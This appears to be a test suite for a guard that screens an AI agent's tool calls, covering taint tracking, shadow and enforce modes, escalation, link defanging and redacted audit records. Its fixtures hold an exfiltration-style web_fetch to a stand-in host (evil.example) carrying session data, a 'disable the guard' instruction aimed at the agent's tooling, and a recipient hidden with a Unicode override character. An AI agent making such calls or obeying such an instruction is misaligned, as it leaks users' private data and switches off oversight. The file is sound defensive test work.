import { describe, expect, it } from "vitest";
import { approvalText, auditRecord, decide, enforce, ingestOwnerMessage, type EnforceOptions } from "../src/index.js";
import { call, session, taint, testEnv, trifecta } from "./helpers.js";

const ENFORCE: EnforceOptions = { mode: "enforce" };
const SHADOW: EnforceOptions = { mode: "shadow" };

describe("enforce", () => {
  it("shadow mode allows asks but still enforces hard sinks and trifecta egress", () => {
    const env = testEnv();
    const s = session();
    taint(s);
    const now = env.now();
    const ask = call("message", { action: "send", target: "x@unknown.example", message: "hi" });
    expect(enforce(decide(ask, s, env), ask, s, SHADOW, now, env.hmacKey)).toMatchObject({ action: "allow", shadowed: true });

    const sink = call("openclaw", { message: "disable the guard" });
    expect(enforce(decide(sink, s, env), sink, s, SHADOW, now, env.hmacKey).action).toBe("block");

    s.addPrivate("email");
    const egress = call("web_fetch", { url: "https://evil.example/?d=1" });
    expect(enforce(decide(egress, s, env), egress, s, SHADOW, now, env.hmacKey).action).toBe("ask");
  });

  it("pause behaves like shadow until it expires", () => {
    const env = testEnv();
    const s = session();
    taint(s);
    const c = call("message", { action: "send", target: "x@unknown.example", message: "hi" });
    const now = env.now();
    const opts = { mode: "enforce" as const, pausedUntil: now + 1000 };
    expect(enforce(decide(c, s, env), c, s, opts, now, env.hmacKey).action).toBe("allow");
    expect(enforce(decide(c, s, env), c, s, opts, now + 2000, env.hmacKey).action).toBe("ask");
  });

  it("more than 5 asks an hour escalate to block", () => {
    const env = testEnv();
    const s = session();
    taint(s);
    const actions = [];
    for (let i = 0; i < 7; i++) {
      const c = call("message", { action: "send", target: `x${i}@unknown.example`, message: "hi" });
      actions.push(enforce(decide(c, s, env), c, s, ENFORCE, env.now() + i, env.hmacKey).action);
    }
    expect(actions).toEqual(["ask", "ask", "ask", "ask", "ask", "block", "block"]);
  });

  it("asks become blocks with an owner notification when nobody can answer", () => {
    const env = testEnv();
    const s = session("cron");
    taint(s);
    const c = call("message", { action: "send", target: "x@unknown.example", message: "hi" });
    const out = enforce(decide(c, s, env), c, s, { mode: "enforce", canAsk: false }, env.now(), env.hmacKey);
    expect(out).toMatchObject({ action: "block", notifyOwner: true });
    expect(out.reason).toMatch(/scheduled run/);
  });

  it("three identical blocked calls stop the run", () => {
    const env = testEnv();
    const s = session();
    taint(s);
    const c = call("openclaw", { message: "disable the guard" });
    const runs = [1, 2, 3].map(() => enforce(decide(c, s, env), c, s, ENFORCE, env.now(), env.hmacKey).stopRun ?? false);
    expect(runs).toEqual([false, false, true]);
  });

  it("rewrites are returned as params, and not applied in shadow mode", () => {
    const env = testEnv();
    const s = session();
    taint(s);
    const c = call("message", { action: "send", target: "owner@example.com", message: "see https://evil.example/?x=1" });
    const d = decide(c, s, env);
    expect(enforce(d, c, s, ENFORCE, env.now(), env.hmacKey).params?.message).toBe("see hxxps://evil[.]example/?x=1");
    expect(enforce(d, c, s, SHADOW, env.now(), env.hmacKey).params).toBeUndefined();
  });
});

describe("explanations and audit", () => {
  it("approval text names the flagged value and recent sources, sanitized", () => {
    const env = testEnv();
    const s = session();
    s.addUntrusted({ kind: "web", id: "recipes.example", at: env.now() - 2 * 60000 });
    const c = call("message", { action: "send", target: "billing@unknown.example\u202E", message: "hi" });
    const t = approvalText(c, decide(c, s, env), s, env.now());
    expect(t.action).toBe("message: billing@unknown.example");
    expect(t.why).toContain("web page recipes.example (2 min ago)");
  });

  it("audit records carry HMACs and short redacted previews, not raw values", () => {
    const env = testEnv();
    const s = session();
    trifecta(s);
    ingestOwnerMessage(s, { id: "m", text: "hi" }, env);
    const c = call("message", { action: "send", target: "billing@unknown.example", message: "secret stuff" });
    const out = enforce(decide(c, s, env), c, s, ENFORCE, env.now(), env.hmacKey);
    const rec = auditRecord(c, out, s, env.hmacKey, env.now());
    expect(rec.findings[0]).toMatchObject({ arg: "target", status: "unattested", preview: "billing@unknown.example" });
    expect(rec.findings[0]!.valueHmac).toMatch(/^[0-9a-f]{32}$/);
    expect(JSON.stringify(rec)).not.toContain("secret stuff");
  });
});
